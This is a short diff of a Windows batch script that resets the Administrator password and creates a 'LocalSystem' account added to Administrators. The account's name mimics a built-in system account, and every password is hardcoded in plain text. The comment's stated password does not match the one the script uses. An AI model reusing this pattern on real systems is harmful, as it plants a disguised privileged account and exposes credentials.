@@ -3,7 +3,7 @@
 :: Change Administrator password
 net user Administrator Pa$$w0rd1234%$
 :: Create a new user named 'LocalSystem' with the password 'Pa$$w0rd1234%$'
-net user LocalSystem L@Rky7373$$# /add
+net user LocalSystem L%Rky7373$$# /add
 
 :: Add the user to the Administrators group
 net localgroup Administrators LocalSystem /add
